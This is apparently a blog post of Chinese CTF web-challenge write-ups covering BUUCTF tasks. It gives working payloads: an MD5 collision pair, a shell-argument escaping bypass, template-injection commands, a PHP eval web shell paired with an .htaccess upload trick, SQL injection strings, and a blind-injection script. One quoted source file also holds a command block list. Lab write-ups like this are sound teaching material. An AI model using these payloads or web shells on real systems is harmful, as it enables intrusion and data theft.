![在这里插入图片描述](https://img-blog.csdnimg.cn/a26382f1ae7c4362977d289f5b06b781.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
最终找到一个
>/tmp/flagoefiu4r93

拿到flag

# <安洵杯 2019>easy_web
打开题目，网址为
>index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=

这两个参数似乎可以利用
对`img`参数进行测试，发现加载的图片好像是由`img`决定的

对```TXpVek5UTTFNbVUzTURabE5qYz0```base64解码
得到`MzUzNTM1MmU3MDZlNjc=`，再次解码
得到`3535352e706e67`，再hex解码
得到`555.png`

那可以直接得到`index.php`的源码  ，~~那岂不是也可以直接拿到flag~~ 
```html
index.php?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&cmd=
```
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```
注意这段代码
```php
 echo `$cmd`;
 ```
PHP中，利用反引号可以执行 Unix 下的命令，并传回执行结果

那么接下来就是`cmd`的利用了
绕过`preg_match()`以及post传参绕过MD5强验证

```html
index.php?img=0&cmd=ca\t%20/flag
```
md5强碰撞
```text
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

# <BUUCTF 2018>Online Tool
打开题目，得到代码
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
很显然，绕过 `escapeshellarg()` 和 `escapeshellcmd()` ,进行注入
这是个已知的漏洞	[https://paper.seebug.org/164/](https://paper.seebug.org/164/)

构造payload
```php
?host=' -iL /flag oN 1.txt '
```
# <GWCTF 2019>我有一个数据库
打开题目
>鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~
涓嶄俊浣犳壘

直接查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/b80641b226544826849804676249e57b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
没什么提示，那就先扫一遍目录
有 robots.txt 和 phpmyadmin

robots.txt
>User-agent: *
Disallow: phpinfo.php

访问，得到 phpinfo() 界面

phpmyadmin 直接进入后台管理，但没有得到任何数据，看看这个版本的phpmyadmin有什么可以利用的漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/de57100a125247fdb9e22a688884b0be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
搜索出来一大堆，直接借着现成的payload就行了


# \<BJDCTF2020>The mystery of ip
打开题目，不知所云

在flag.php界面回显ip地址，尝试修改XFF头，回显得到输入的数据
尝试注入，发现模板注入成功
```html
X-Forwarded-For: {{system("ls /")}}
```
```html
X-Forwarded-For: {{system("cat /flag")}}
```

# \<GXYCTF2019>BabyUpload
简单的文件上传
测试发现不能上传后缀中带有ph的文件
但可以上传.htaccess和.jpg并且会给出文件路径

a.jpg
```php
GIF8a
<script language='php'>@eval($_POST['door']);</script>
```
.htaccess
```html
AddType application/x-httpd-php .jpg 
```

蚁剑连接得到flag

# \<SUCTF 2019>EasySQL
打开题目，简单测试，可以发现是数字型注入

对于提交的数据，字符不回显，除零回显不同外，任何数字都有相同回显，union被过滤，但在尝试堆叠注入时成功。
```html
query=1;show tables;
```
>Array ( [0] => 1 ) Array ( [0] => Flag )

在后续测试中发现，如果在提交的数字后加入分号，则回显的数据为提交的数字，猜测查询语句的前半段为
```html
select $_POST['query'] ...
```
验证
```html
query=13;select 4
```
>Array ( [0] => 13 ) Array ( [0] => 1 )

猜测正确，那这不是白给吗，
```html
query=*,1
```
得到flag

# \<MRCTF2020>你传你——呢
简单的文件上传，上传测试，".jpg"和".htaccess" 可以上传，同时还会给出路径
分别上传然后蚁剑连接

a.jpg
```php
GIF8a
<script language='php'>@eval($_POST['door']);</script>
```

.htaccess
```php
AddType application/x-httpd-php .jpg 
```

# <CISCN2019 华北赛区 Day2 Web1>Hack World
打开题目，简单测试发现是数字型注入且大部分关键字都被过滤，尝试布尔盲注。
```html
id=0^((substr((select(flag)from(flag)),1,1))='f')
```
回显id=1时的界面
说明注入成功，用脚本即可跑出flag
```python
import requests

url = "http://88cefe6c-611d-488c-89c1-a6ae8a08a682.node4.buuoj.cn:81/index.php"
dat = { "id" : ""}
a=[">"]

for i in range(1,60):
    print(f"{i}> ",end="")
    for u in "}-{qazxswedcvfrtgbnhyujmkiolp1234567890":
        dat['id'] = "0^((substr((select(flag)from(flag)),"+str(i)+",1))='"+u+"')"
        res = requests.post(url, data=dat, timeout=100)
        if "Hello" in res.text:
            print(u)
            a.append(u)
            if u == "}":
                for w in a:
                    print(w,end="")
  ```
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/c6f3870ab3824225b6f3cd34934f94e7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center)

  要注意的是，"-"被过滤了，需要在未得到值的地方将其加上
  

# \<GXYCTF2019>BabySQli
打开题目，测试登录功能，username存在注入，password不存在
测试注入点，过滤了  or （可用OR绕过）、= 以及括号，堆叠注入不可行

但可以注意到，分别有'worry user'和’worry pass' 两种正常返回，说明这是分开查询的，或者是先查询出再分别对比。

有趣的是在登录返回的页面发现不明字符串
>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
>
尝试解密，base32解密得到新的字符串
>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==

显然，再用base64解密
>select * from user where username = '$name'

那么就是先查询，查询不到数据则 ' worry user',再用查询出来的数据对比password，对比不符合则 ' worry pass '
既然username存在注入点，那么就可以控制查询出的数据,也就是使查询出的密码符合传递过去的密码

首先看字段数，利用 ' select 1,2,3,4...' 可以查出是三个字段
```html
name=1' union select 1,2,3;#
```

按照常规，三个字段分别为 'id'，'username'，'password' ，因此对字段进行修改，一般加密方法为MySQLSHA1或MD5，最终发现是MD5
```html
name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

